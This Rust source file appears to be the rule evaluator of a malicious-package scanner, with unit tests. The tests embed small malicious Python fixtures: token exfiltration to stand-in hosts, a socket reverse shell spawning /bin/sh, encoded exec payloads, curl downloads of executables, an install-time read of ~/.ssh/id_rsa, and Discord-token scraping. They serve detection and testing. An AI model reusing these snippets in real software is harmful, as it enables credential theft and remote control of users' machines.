//! The evaluator: one pass per rule over the package graph
//! (DECISIONS.md, ADR-009, ADR-010; EVALUATION.md §6 for the ablation modes).

use std::collections::BTreeSet;

use phylaxis_core::{
    AnalysisMode, Confidence, Evidence, ExecutionPhase, Finding, PackageGraph, PathStep,
    PathStepKind, ReachabilityKind, ReachabilityPath, RiskScore, RuleSpec, ScanOptions, Severity,
    TaintSink, TaintSinkKind, TaintSource, TaintSourceKind, Verdict,
};
use phylaxis_graph::reach::{
    ReachLimits, SourcePattern, control_paths, data_paths_to, data_paths_via, find_sinks,
    find_sources,
};

use crate::catalogue::{RULES, SINK_PATTERNS, SOURCE_PATTERNS};
use crate::error::RulesError;

/// The one rule whose control target is a *read* rather than a sink call: RULES.md defines
/// PHX-INS-003 as "a definition containing a `SensitiveFile` read, reachable from an install
/// root". `RuleSpec` has no field for that, so the engine recognises the rule by id and
/// targets the definitions that contain a matching read. The kinds in its `sinks` field are
/// not consulted. Filed as an open request in DECISIONS.md.
const SENSITIVE_READ_RULE: &str = "PHX-INS-003";

/// "Download, write, execute" (ADR-029): the path must pass through a write into a file.
/// Without that step the rule was PHX-DRP-001's predicate under another name.
const VIA_FILE_WRITE_RULE: &str = "PHX-DRP-002";

/// PHX-INS-002 is Medium, and High when the callee is `exec`/`eval` (RULES.md).
const INSTALL_EXEC_RULE: &str = "PHX-INS-002";
const EVAL_LIKE: &[&str] = &["exec", "eval", "compile"];

/// Evaluates every catalogue rule under `opts.mode`, applies `opts.min_confidence`, and
/// returns findings in canonical order (rule order, then path order).
pub fn evaluate(pg: &PackageGraph, opts: &ScanOptions) -> Result<Vec<Finding>, RulesError> {
    let mut out = Vec::new();
    for rule in RULES {
        out.extend(evaluate_rule(pg, rule, opts.mode)?);
    }
    if let Some(min) = opts.min_confidence {
        out.retain(|f| f.confidence >= min);
    }
    Ok(out)
}

/// Evaluates one rule:
/// - collect sources matching `rule.sources` and sinks matching `rule.sinks` from the
///   catalogue patterns (`phylaxis_graph::reach::{find_sources, find_sinks}`);
/// - `Reachability { .. }`: `data_paths` for `Data` rules, `control_paths` from every
///   root of the rule's phase for `Control` rules;
/// - `FileCooccurrence` / `DefinitionCooccurrence`: `cooccurrence_paths` instead;
/// - wrap each path in `Evidence` with the phase of the sink's definition
///   (`pg.phases.phase_of`) and build the `Finding` via `Finding::new` with
///   `mode.phase_weighting()`.
///
/// Snippets are left empty: the package graph carries spans, not source text, and the
/// caller that holds the files (the CLI) is the one that can cut them.
pub fn evaluate_rule(
    pg: &PackageGraph,
    rule: &RuleSpec,
    mode: AnalysisMode,
) -> Result<Vec<Finding>, RulesError> {
    let targets = targets(pg, rule);
    let paths: Vec<(ReachabilityPath, &TaintSink)> = match mode {
        AnalysisMode::Reachability { .. } => match rule.reachability {
            ReachabilityKind::Data => {
                let sources = sources(pg, rule.sources);
                // One search per source serves every sink; the index pairs each path with
                // the sink it ends at, which is what the phase is read from.
                let found = if rule.id == VIA_FILE_WRITE_RULE {
                    let writes: Vec<_> = pg.dfg.file_writes.iter().map(|&(w, _)| w).collect();
                    data_paths_via(pg, &sources, &writes, &targets, &ReachLimits::default())
                } else {
                    data_paths_to(pg, &sources, &targets, &ReachLimits::default())
                };
                let mut out: Vec<(ReachabilityPath, &TaintSink, usize)> = found
                    .into_iter()
                    .map(|(path, i)| (path, &targets[i], i))
                    .collect();
                // Canonical path order: by source location, then sink location, then the
                // sink's position in `targets` (the order a per-sink search produced).
                out.sort_by(|a, b| {
                    let key = |p: &ReachabilityPath| {
                        (
                            p.steps.first().map(|s| s.location.clone()),
                            p.steps.last().map(|s| s.location.clone()),
                        )
                    };
                    (key(&a.0), a.2).cmp(&(key(&b.0), b.2))
                });
                let out: Vec<(ReachabilityPath, &TaintSink)> =
                    out.into_iter().map(|(p, s, _)| (p, s)).collect();
                out
            }
            ReachabilityKind::Control => {
                let mut out = Vec::new();
                // One finding per target: the first root (in root order) that reaches it.
                let mut reached = BTreeSet::new();
                for root in pg
                    .phases
                    .roots
                    .iter()
                    .filter(|r| r.phase == rule.technique.typical_phase)
                {
                    for sink in &targets {
                        if reached.contains(&sink.node) {
                            continue;
                        }
                        let found = control_paths(
                            pg,
                            root,
                            std::slice::from_ref(sink),
                            &ReachLimits::default(),
                        );
                        if let Some(path) = found.into_iter().next() {
                            reached.insert(sink.node);
                            out.push((path, sink));
                        }
                    }
                }
                out.sort_by(|a, b| a.1.location.cmp(&b.1.location));
                out
            }
        },
        AnalysisMode::FileCooccurrence | AnalysisMode::DefinitionCooccurrence => {
            cooccurrence(pg, rule, mode, &targets)
        }
    };

    let mut findings = Vec::with_capacity(paths.len());
    for (path, sink) in paths {
        let phase = phase_of_definition(pg, sink);
        let severity = severity(rule, sink);
        let message = format!(
            "{}: {} reaches {}",
            rule.title,
            path.steps.first().map_or("?", |s| s.symbol.as_str()),
            sink.pattern
        );
        let evidence = Evidence {
            path,
            phase,
            snippets: Vec::new(),
        };
        findings.push(Finding::new(
            rule.rule_id(),
            rule.technique,
            severity,
            evidence,
            message,
            mode.phase_weighting(),
        )?);
    }
    Ok(findings)
}

/// The ablation's co-occurrence predicates (EVALUATION.md §6, configurations A and B):
/// for each (source, sink) pair in the same file (A) or with the same owning definition
/// (B), emit a synthetic two-step path `[Source, Sink]` with `Confidence::Resolved`.
/// No graph traversal happens: that is the point of the ablation.
pub fn cooccurrence_paths(
    pg: &PackageGraph,
    rule: &RuleSpec,
    mode: AnalysisMode,
) -> Vec<ReachabilityPath> {
    let targets = targets(pg, rule);
    cooccurrence(pg, rule, mode, &targets)
        .into_iter()
        .map(|(path, _)| path)
        .collect()
}

fn cooccurrence<'a>(
    pg: &PackageGraph,
    rule: &RuleSpec,
    mode: AnalysisMode,
    targets: &'a [TaintSink],
) -> Vec<(ReachabilityPath, &'a TaintSink)> {
    // A phase root stands for the rule's phase only, exactly as the control search filters
    // `pg.phases.roots`: without this, an `__init__.py` (Import root) satisfied PHX-INS-*.
    let phase = rule.technique.typical_phase;
    let mut sources = sources(pg, rule.sources);
    sources.retain(|s| s.kind != TaintSourceKind::PhaseRoot || is_root_of_phase(pg, s, phase));
    let mut out = Vec::new();
    for sink in targets {
        // Only the first co-occurring source per sink: the predicate is "some source of the
        // rule's kind is here", and one pair is the evidence for it.
        let partner = sources.iter().find(|source| match mode {
            AnalysisMode::FileCooccurrence => source.location.file == sink.location.file,
            _ => source_owner(pg, source) == sink_owner(pg, sink),
        });
        let Some(source) = partner else { continue };
        let path = ReachabilityPath {
            kind: rule.reachability,
            steps: vec![
                PathStep {
                    kind: PathStepKind::Source,
                    location: source.location.clone(),
                    symbol: source.pattern.to_string(),
                    detail: None,
                },
                PathStep {
                    kind: PathStepKind::Sink,
                    location: sink.location.clone(),
                    symbol: sink.pattern.to_string(),
                    detail: None,
                },
            ],
            confidence: Confidence::Resolved,
            obfuscated: source.kind == TaintSourceKind::DecodedLiteral,
            conditional: false,
        };
        out.push((path, sink));
    }
    out
}

/// Whether a `PhaseRoot` source is a root of `phase`. The source carries only the root's
/// call-graph node, so the root is found again by that node.
fn is_root_of_phase(pg: &PackageGraph, source: &TaintSource, phase: ExecutionPhase) -> bool {
    pg.phases
        .roots
        .iter()
        .any(|r| r.phase == phase && pg.call_graph.node_of(r.symbol) == Some(source.node))
}

/// Every occurrence of the rule's source kinds, in canonical order.
fn sources(pg: &PackageGraph, kinds: &[TaintSourceKind]) -> Vec<TaintSource> {
    let patterns: Vec<SourcePattern> = SOURCE_PATTERNS
        .iter()
        .filter(|p| kinds.contains(&p.kind))
        .copied()
        .collect();
    find_sources(pg, &patterns)
}

/// What the rule's paths end at: sink calls for every rule but PHX-INS-003, whose target
/// is the sensitive read itself, presented as a sink so the control search and the finding
/// constructor treat it like any other target.
fn targets(pg: &PackageGraph, rule: &RuleSpec) -> Vec<TaintSink> {
    if rule.id == SENSITIVE_READ_RULE {
        return sources(pg, &[TaintSourceKind::SensitiveFile])
            .into_iter()
            .filter_map(|read| {
                let owner = pg.owner_of_flow_node(read.node)?;
                Some(TaintSink {
                    // Not consulted downstream; see `SENSITIVE_READ_RULE`.
                    kind: TaintSinkKind::NetworkEgress,
                    pattern: read.pattern,
                    location: read.location,
                    node: read.node,
                    definition: pg.call_graph.node_of(owner)?,
                })
            })
            .collect();
    }
    let patterns: Vec<_> = SINK_PATTERNS
        .iter()
        .filter(|p| rule.sinks.contains(&p.kind))
        .copied()
        .collect();
    find_sinks(pg, &patterns)
}

fn phase_of_definition(pg: &PackageGraph, sink: &TaintSink) -> ExecutionPhase {
    pg.call_graph
        .graph
        .node_weight(sink.definition)
        .map_or(ExecutionPhase::Runtime, |n| pg.phases.phase_of(n.symbol))
}

fn severity(rule: &RuleSpec, sink: &TaintSink) -> Severity {
    if rule.id == INSTALL_EXEC_RULE && EVAL_LIKE.contains(&sink.pattern.as_str()) {
        return Severity::High;
    }
    rule.severity
}

/// The definition a source sits in. A phase-root source's node is a call-graph node, not a
/// data-flow node, so it is read from the call graph.
fn source_owner(pg: &PackageGraph, source: &TaintSource) -> Option<phylaxis_core::SymbolId> {
    if source.kind == TaintSourceKind::PhaseRoot {
        return pg
            .call_graph
            .graph
            .node_weight(source.node)
            .map(|n| n.symbol);
    }
    pg.owner_of_flow_node(source.node)
}

fn sink_owner(pg: &PackageGraph, sink: &TaintSink) -> Option<phylaxis_core::SymbolId> {
    pg.call_graph
        .graph
        .node_weight(sink.definition)
        .map(|n| n.symbol)
}

/// Package-level aggregate and verdict (ADR-010).
pub fn score_package(findings: &[Finding]) -> (RiskScore, Verdict) {
    let risk = RiskScore::aggregate(findings);
    (risk, Verdict::from(risk))
}

#[cfg(test)]
mod tests {
    use super::*;
    use phylaxis_core::{FileId, ProjectMeta, RuleId, SourceFile, SourceKind};

    fn graph(files: &[(&str, &str)]) -> PackageGraph {
        let mut sorted: Vec<_> = files.to_vec();
        sorted.sort_by(|a, b| a.0.cmp(b.0));
        let sources: Vec<SourceFile> = sorted
            .iter()
            .enumerate()
            .map(|(i, (p, s))| SourceFile {
                id: FileId(i as u32),
                rel_path: (*p).to_owned(),
                kind: SourceFile::classify(p).unwrap_or(SourceKind::Python),
                bytes: s.as_bytes().to_vec(),
            })
            .collect();
        let asts: Vec<_> = sources
            .iter()
            .map(|f| phylaxis_parse::parse_python(f).unwrap())
            .collect();
        phylaxis_graph::build_package_graph(
            &asts,
            &ProjectMeta {
                top_level_modules: vec!["pkg".into()],
                ..Default::default()
            },
        )
        .unwrap()
    }

    const EXFIL: &str =
        "import os, requests\nrequests.post('https://c.invalid/', data=os.environ['TOKEN'])\n";
    const DISJOINT: &str = "import os, requests\nt = os.environ['TOKEN']\nrequests.post('https://c.invalid/', data='static')\n";

    // The ablation contract in one place: A flags the disjoint file, D does not.
    #[test]
    fn cooccurrence_flags_disjoint_but_reachability_does_not() {
        let g = graph(&[("setup.py", DISJOINT)]);
        let a = evaluate(
            &g,
            &ScanOptions {
                mode: AnalysisMode::FileCooccurrence,
                ..Default::default()
            },
        )
        .unwrap();
        let d = evaluate(&g, &ScanOptions::default()).unwrap();
        assert!(
            a.iter().any(|f| f.rule.as_str() == "PHX-EXF-001"),
            "A: file co-occurrence fires"
        );
        assert!(
            !d.iter().any(|f| f.rule.as_str() == "PHX-EXF-001"),
            "D: no path, no finding"
        );
    }

    // The install rules in A and B mean "sink in an install file / install root" (§6). An
    // `__init__.py` is an Import root: its module-level eval is not install-time execution,
    // and a plain setup.py does not import it. Found on the test set, 2026-10-01.
    #[test]
    fn cooccurrence_install_rules_ignore_import_roots() {
        let plain = "from setuptools import setup\nsetup(name='pkg')\n";
        let g = graph(&[("setup.py", plain), ("pkg/__init__.py", "x = eval('1')\n")]);
        for mode in [
            AnalysisMode::FileCooccurrence,
            AnalysisMode::DefinitionCooccurrence,
        ] {
            let found = evaluate(
                &g,
                &ScanOptions {
                    mode,
                    ..Default::default()
                },
            )
            .unwrap();
            assert!(
                !found
                    .iter()
                    .any(|f| f.rule.as_str().starts_with("PHX-INS-")),
                "{mode:?}: an import root is not an install root"
            );
        }
        let g = graph(&[("setup.py", "x = eval('1')\n")]);
        let b = evaluate(
            &g,
            &ScanOptions {
                mode: AnalysisMode::DefinitionCooccurrence,
                ..Default::default()
            },
        )
        .unwrap();
        assert!(
            b.iter().any(|f| f.rule.as_str() == "PHX-INS-002"),
            "B: eval in setup.py's own body still fires"
        );
    }

    // A token sent over a socket held in a variable. Before ADR-025 `s.send` was named by
    // its text and no `socket.socket.*` pattern could match it: no finding at all.
    #[test]
    fn exfiltration_over_a_socket_in_a_variable_fires() {
        let src = "import os, socket\ndef beacon():\n    s = socket.socket()\n    s.connect(('203.0.113.9', 1))\n    s.send(os.environ['TOKEN'].encode())\n";
        let g = graph(&[("pkg/__init__.py", src)]);
        let d = evaluate(&g, &ScanOptions::default()).unwrap();
        let ends: Vec<_> = d
            .iter()
            .filter(|f| f.rule.as_str() == "PHX-EXF-001")
            .map(|f| {
                (
                    f.evidence.path.steps.last().map(|s| s.symbol.clone()),
                    f.confidence,
                )
            })
            .collect();
        assert!(
            ends.contains(&(
                Some("socket.socket.send".to_owned()),
                phylaxis_core::Confidence::Resolved
            )),
            "{ends:?}"
        );
    }

    // The reverse shell kept on `self`, its socket opened in one method and used in another.
    // The address reaches `dup2` through the typed attribute's receiver write.
    #[test]
    fn a_reverse_shell_held_on_self_fires() {
        let src = "import os, pty, socket\n\
                   class Shell:\n    def __init__(self):\n        self.link = None\n\
                   \x20   def _open(self):\n        self.link = socket.socket()\n\
                   \x20   def connect(self):\n        self._open()\n\
                   \x20       self.link.connect(('203.0.113.9', 4444))\n\
                   \x20       os.dup2(self.link.fileno(), 0)\n        pty.spawn('/bin/sh')\n";
        let g = graph(&[("pkg/__init__.py", src)]);
        let d = evaluate(
            &g,
            &ScanOptions {
                mode: AnalysisMode::Reachability {
                    phase_weighting: false,
                },
                ..Default::default()
            },
        )
        .unwrap();
        assert!(
            d.iter().any(|f| f.rule.as_str() == "PHX-BKD-001"
                && f.confidence == phylaxis_core::Confidence::Resolved),
            "{:?}",
            d.iter().map(|f| f.rule.as_str()).collect::<Vec<_>>()
        );
    }

    #[test]
    fn reachability_flags_real_exfiltration_at_install_phase() {
        let g = graph(&[("setup.py", EXFIL)]);
        let d = evaluate(&g, &ScanOptions::default()).unwrap();
        let f = d
            .iter()
            .find(|f| f.rule.as_str() == "PHX-EXF-001")
            .expect("EXF-001 fires");
        assert_eq!(f.phase, phylaxis_core::ExecutionPhase::Install);
        assert_eq!(f.score.value(), 1.0);
        assert!(f.evidence.path.is_well_formed());
        let (risk, verdict) = score_package(&d);
        assert_eq!(verdict, Verdict::Malicious);
        assert!(risk.value() >= 0.7);
    }

    // Configuration C: same findings as D, phase weight 1.0 (the runtime variant scores
    // higher under C than under D).
    #[test]
    fn mode_c_removes_phase_weighting_only() {
        let g = graph(&[(
            "pkg/a.py",
            &format!(
                "def f():\n{}",
                EXFIL
                    .lines()
                    .map(|l| format!("    {l}\n"))
                    .collect::<String>()
            ),
        )]);
        let c = evaluate(
            &g,
            &ScanOptions {
                mode: AnalysisMode::Reachability {
                    phase_weighting: false,
                },
                ..Default::default()
            },
        )
        .unwrap();
        let d = evaluate(&g, &ScanOptions::default()).unwrap();
        assert_eq!(c.len(), d.len());
        assert!(c[0].score > d[0].score);
        assert_eq!(c[0].evidence.path, d[0].evidence.path);
    }

    // min_confidence filters, never rescoring.
    #[test]
    fn min_confidence_filters_ambiguous_findings() {
        let src = "import os, requests\nclass S:\n    def send(self, v):\n        requests.post('https://c.invalid/', data=v)\ndef go(obj):\n    obj.send(os.environ['TOKEN'])\n";
        let g = graph(&[("pkg/a.py", src)]);
        let all = evaluate(&g, &ScanOptions::default()).unwrap();
        assert!(
            all.iter()
                .any(|f| f.confidence == phylaxis_core::Confidence::Ambiguous)
        );
        let strict = evaluate(
            &g,
            &ScanOptions {
                min_confidence: Some(phylaxis_core::Confidence::Resolved),
                ..Default::default()
            },
        )
        .unwrap();
        assert!(
            strict
                .iter()
                .all(|f| f.confidence == phylaxis_core::Confidence::Resolved)
        );
    }

    // An aliased decoder over a variable still fires OBF-001: the shape of the b64_exec
    // fixture, with `import base64 as b` on top.
    #[test]
    fn aliased_decoder_through_variable_fires_obf_001() {
        let g = graph(&[(
            "setup.py",
            "import base64 as b\n_BLOB = 'aW1wb3J0IG9z'\nexec(b.b64decode(_BLOB).decode('utf-8'))\n",
        )]);
        let d = evaluate(&g, &ScanOptions::default()).unwrap();
        let f = d
            .iter()
            .find(|f| f.rule.as_str() == "PHX-OBF-001")
            .expect("OBF-001 fires");
        assert!(f.evidence.path.obfuscated);
        assert_eq!(f.phase, phylaxis_core::ExecutionPhase::Install);
    }

    // INS-003 targets the sensitive read itself: a setup.py that reads ~/.ssh and sends
    // nothing still fires it, and one that reads a relative file does not.
    #[test]
    fn ins_003_fires_on_an_install_phase_sensitive_read_alone() {
        let read = graph(&[(
            "setup.py",
            "import os\nwith open(os.path.expanduser('~/.ssh/id_rsa')) as fh:\n    k = fh.read()\n",
        )]);
        let d = evaluate(&read, &ScanOptions::default()).unwrap();
        assert!(d.iter().any(|f| f.rule.as_str() == "PHX-INS-003"));

        let plain = graph(&[(
            "setup.py",
            "with open('README.md') as fh:\n    long_description = fh.read()\n",
        )]);
        let d = evaluate(&plain, &ScanOptions::default()).unwrap();
        assert!(!d.iter().any(|f| f.rule.as_str() == "PHX-INS-003"));
    }

    // INS-002 is Medium, and High when the callee is exec/eval.
    #[test]
    fn ins_002_is_high_for_exec_and_medium_for_subprocess() {
        let g = graph(&[(
            "setup.py",
            "import subprocess\nsubprocess.run(['git', 'describe'])\nexec('x = 1')\n",
        )]);
        let d = evaluate(&g, &ScanOptions::default()).unwrap();
        let ins: Vec<_> = d
            .iter()
            .filter(|f| f.rule.as_str() == "PHX-INS-002")
            .map(|f| f.severity)
            .collect();
        assert!(ins.contains(&phylaxis_core::Severity::High));
        assert!(ins.contains(&phylaxis_core::Severity::Medium));
    }

    #[test]
    fn findings_are_in_canonical_rule_order() {
        let g = graph(&[(
            "setup.py",
            "import os, base64, requests\nexec(base64.b64decode('aW1wb3J0IG9z'))\nrequests.post('https://c.invalid/', data=os.environ['T'])\n",
        )]);
        let d = evaluate(&g, &ScanOptions::default()).unwrap();
        let ids: Vec<&str> = d.iter().map(|f| f.rule.as_str()).collect();
        let mut sorted_by_catalogue = ids.clone();
        sorted_by_catalogue.sort_by_key(|id| RULES.iter().position(|r| r.id == *id));
        assert_eq!(ids, sorted_by_catalogue);
        assert!(ids.contains(&"PHX-OBF-001") && ids.contains(&"PHX-EXF-001"));
        assert!(RuleId::parse(ids[0]).is_ok());
    }

    // ── ADR-028: misses found by the test-set error analysis, each a twin pair ──────────

    fn rules_d(files: &[(&str, &str)]) -> Vec<String> {
        let g = graph(files);
        evaluate(&g, &ScanOptions::default())
            .unwrap()
            .iter()
            .map(|f| f.rule.as_str().to_owned())
            .collect()
    }

    // RULES.md lists `chr`-join under OBF-001; `chr` over constants was never a decoder.
    // Twin: the same decoded string printed instead of executed.
    #[test]
    fn chr_join_over_constants_executed_fires_obf_001() {
        let bad = "x = ''.join(chr(i) for i in [112, 114, 105, 110, 116])\nexec(x)\n";
        let good = "x = ''.join(chr(i) for i in [112, 114, 105, 110, 116])\nprint(x)\n";
        assert!(rules_d(&[("pkg/__init__.py", bad)]).contains(&"PHX-OBF-001".to_owned()));
        assert!(!rules_d(&[("pkg/__init__.py", good)]).contains(&"PHX-OBF-001".to_owned()));
    }

    // A literal spelled in escape sequences is encoded by the lexer instead of by `base64`
    // (BlankOBF: `eval("\145\166\141\154")`). Twin: an ANSI colour code, one escape.
    #[test]
    fn escape_encoded_literal_executed_fires_obf_001() {
        let bad = r#"f = eval("\145\166\x61\x6c")
f("print(1)")
"#;
        let good = r#"print("\x1b[31m" + "red")
eval("1 + 1")
"#;
        assert!(rules_d(&[("pkg/__init__.py", bad)]).contains(&"PHX-OBF-001".to_owned()));
        assert!(!rules_d(&[("pkg/__init__.py", good)]).contains(&"PHX-OBF-001".to_owned()));
    }

    // DRP-003, "raw endpoint executed": the URL sits inside the command, not alone.
    // Twin: the same command shape with no endpoint in it.
    #[test]
    fn url_inside_an_executed_command_fires_drp_003() {
        let bad = "import subprocess\nsubprocess.run(['powershell', '-Command', 'curl.exe -L https://evil.invalid/a.exe -o x.exe'])\n";
        let good = "import subprocess\nsubprocess.run(['powershell', '-Command', 'Get-ChildItem -Path . -Recurse'])\nprint('docs: https://example.invalid/help')\n";
        assert!(rules_d(&[("pkg/__init__.py", bad)]).contains(&"PHX-DRP-003".to_owned()));
        assert!(!rules_d(&[("pkg/__init__.py", good)]).contains(&"PHX-DRP-003".to_owned()));
    }

    // An f-string's fixed text is a literal too; only its `{…}` parts are not.
    #[test]
    fn url_inside_an_executed_f_string_fires_drp_003() {
        let bad = "import subprocess\nout = 'x.exe'\nsubprocess.run(['powershell', '-Command', f'curl.exe -L https://evil.invalid/a.exe -o \"{out}\"'])\n";
        let good = "import subprocess\nout = 'x.exe'\nsubprocess.run(['powershell', '-Command', f'Remove-Item \"{out}\"'])\n";
        assert!(rules_d(&[("pkg/__init__.py", bad)]).contains(&"PHX-DRP-003".to_owned()));
        assert!(!rules_d(&[("pkg/__init__.py", good)]).contains(&"PHX-DRP-003".to_owned()));
    }

    // Messenger webhooks are network egress. Twin: the webhook posts a constant.
    #[test]
    fn identity_sent_through_a_discord_webhook_fires_exf_003() {
        let bad = "import socket\nfrom discord import SyncWebhook\nhost = socket.gethostname()\nw = SyncWebhook.from_url('https://discord.invalid/api/webhooks/1/x')\nw.send(content=f'{host}')\n";
        let good = "import socket\nfrom discord import SyncWebhook\nhost = socket.gethostname()\nw = SyncWebhook.from_url('https://discord.invalid/api/webhooks/1/x')\nw.send(content='build finished')\n";
        assert!(rules_d(&[("pkg/__init__.py", bad)]).contains(&"PHX-EXF-003".to_owned()));
        assert!(!rules_d(&[("pkg/__init__.py", good)]).contains(&"PHX-EXF-003".to_owned()));
    }

    // Stealers regex-extract tokens from what they read; a match is part of its input.
    // Twin: the regex runs over a constant, the file content is never sent.
    #[test]
    fn a_secret_extracted_by_regex_is_still_exfiltrated() {
        let bad = "import os, re, requests\np = os.getenv('APPDATA') + '/x/leveldb/000003.log'\nfor t in re.findall(r'[A-Za-z0-9-]{24}[.][A-Za-z0-9-]{6}', open(p).read()):\n    requests.post('https://c.invalid/', data=t)\n";
        let good = "import os, re, requests\np = os.getenv('APPDATA') + '/x/leveldb/000003.log'\nopen(p).read()\nfor t in re.findall(r'[a-z]+', 'static text'):\n    requests.post('https://c.invalid/', data=t)\n";
        assert!(rules_d(&[("pkg/__init__.py", bad)]).contains(&"PHX-EXF-001".to_owned()));
        assert!(!rules_d(&[("pkg/__init__.py", good)]).contains(&"PHX-EXF-001".to_owned()));
    }

    // A list built by appending carries what was appended (ADR-028). Twin: the same list
    // built from constants, sent after the secret was read and dropped.
    #[test]
    fn a_secret_collected_into_a_list_is_still_exfiltrated() {
        let bad = "import os, requests
found = []
found.append(os.environ['TOKEN'])
requests.post('https://c.invalid/', data=','.join(found))
";
        let good = "import os, requests
found = []
os.environ['TOKEN']
found.append('static')
requests.post('https://c.invalid/', data=','.join(found))
";
        assert!(rules_d(&[("pkg/__init__.py", bad)]).contains(&"PHX-EXF-001".to_owned()));
        assert!(!rules_d(&[("pkg/__init__.py", good)]).contains(&"PHX-EXF-001".to_owned()));
    }

    // ── ADR-029: execution sinks execute their first argument only ─────────────────────

    // The endpoint handed to `env=` is configuration; in the command it is executed.
    #[test]
    fn a_url_in_env_is_not_an_executed_endpoint() {
        let bad = "import subprocess
subprocess.run(['curl', 'https://evil.example.invalid/a.sh'])
";
        let good = "import subprocess
subprocess.run(['git', 'status'], env={'PROXY': 'https://proxy.example.invalid/'})
";
        assert!(rules_d(&[("pkg/__init__.py", bad)]).contains(&"PHX-DRP-003".to_owned()));
        assert!(!rules_d(&[("pkg/__init__.py", good)]).contains(&"PHX-DRP-003".to_owned()));
    }

    // A decoded literal executed is OBF-001; one passed as exec's globals is not code.
    #[test]
    fn a_decoded_literal_in_exec_globals_is_not_executed() {
        let bad = "import base64
exec(base64.b64decode('cHJpbnQoMSk='))
";
        let good = "import base64
exec('x = 1', {'k': base64.b64decode('cHJpbnQoMSk=')})
";
        assert!(rules_d(&[("pkg/__init__.py", bad)]).contains(&"PHX-OBF-001".to_owned()));
        assert!(!rules_d(&[("pkg/__init__.py", good)]).contains(&"PHX-OBF-001".to_owned()));
    }

    // No positional argument: the pattern keeps every argument rather than going silent.
    #[test]
    fn a_keyword_only_command_still_counts() {
        let src = "import subprocess
subprocess.run(args=['curl', 'https://evil.example.invalid/a.sh'])
";
        assert!(rules_d(&[("pkg/__init__.py", src)]).contains(&"PHX-DRP-003".to_owned()));
    }

    // DRP-002 needs the write (ADR-029): executing a download directly is DRP-001 alone;
    // writing it to a file that is then run is DRP-002, and the write shows in the path.
    #[test]
    fn drp_002_requires_the_file_write_and_drp_001_does_not() {
        let direct = "import urllib.request
exec(urllib.request.urlopen('https://h.example.invalid/p').read())
";
        let written = "import subprocess, urllib.request
p = '/tmp/payload'
data = urllib.request.urlopen('https://h.example.invalid/p').read()
with open(p, 'wb') as fh:
    fh.write(data)
subprocess.run([p])
";
        let d = rules_d(&[("pkg/__init__.py", direct)]);
        assert!(
            d.contains(&"PHX-DRP-001".to_owned()) && !d.contains(&"PHX-DRP-002".to_owned()),
            "{d:?}"
        );
        let g = graph(&[("pkg/__init__.py", written)]);
        let f = evaluate(&g, &ScanOptions::default()).unwrap();
        let drp2 = f
            .iter()
            .find(|f| f.rule.as_str() == "PHX-DRP-002")
            .expect("DRP-002 fires");
        assert!(drp2.evidence.path.is_well_formed());
        assert!(
            drp2.evidence
                .path
                .steps
                .iter()
                .any(|s| s.detail.as_deref() == Some("written to a file")),
            "{:?}",
            drp2.evidence.path.steps
        );
    }

    // ── ADR-030: conditional execution is labelled, never weighed ──────────────────────

    fn exfil_paths(src: &str) -> Vec<(bool, f64)> {
        let g = graph(&[("pkg/__init__.py", src)]);
        evaluate(&g, &ScanOptions::default())
            .unwrap()
            .iter()
            .filter(|f| f.rule.as_str() == "PHX-EXF-001")
            .map(|f| (f.evidence.path.conditional, f.score.value()))
            .collect()
    }

    const SEND: &str = "requests.post('https://c.example.invalid/', data=os.environ['TOKEN'])";

    #[test]
    fn a_payload_under_an_os_check_is_conditional_and_scores_the_same() {
        let guarded = format!(
            "import os, platform, requests
if platform.system() == 'Windows':
    {SEND}
"
        );
        let plain = format!(
            "import os, requests
{SEND}
"
        );
        let debug = format!(
            "import os, requests
DEBUG = True
if DEBUG:
    {SEND}
"
        );
        let g = exfil_paths(&guarded);
        let p = exfil_paths(&plain);
        let d = exfil_paths(&debug);
        assert_eq!(g.len(), 1, "{g:?}");
        assert!(g[0].0, "guarded by an OS check");
        assert!(
            !p[0].0 && !d[0].0,
            "plain and DEBUG-guarded are not conditional"
        );
        assert_eq!(g[0].1, p[0].1, "a label, not a weight");
    }

    #[test]
    fn aliased_guards_and_else_branches_are_conditional() {
        let aliased = format!(
            "import os, requests
import platform as p
if p.system() == 'Linux':
    {SEND}
"
        );
        let otherwise = format!(
            "import os, sys, requests
if sys.platform == 'darwin':
    pass
else:
    {SEND}
"
        );
        let host = format!(
            "import os, socket, requests
if socket.gethostname().startswith('build'):
    {SEND}
"
        );
        for src in [aliased, otherwise, host] {
            let paths = exfil_paths(&src);
            assert!(!paths.is_empty() && paths.iter().all(|(c, _)| *c), "{src}");
        }
    }
}
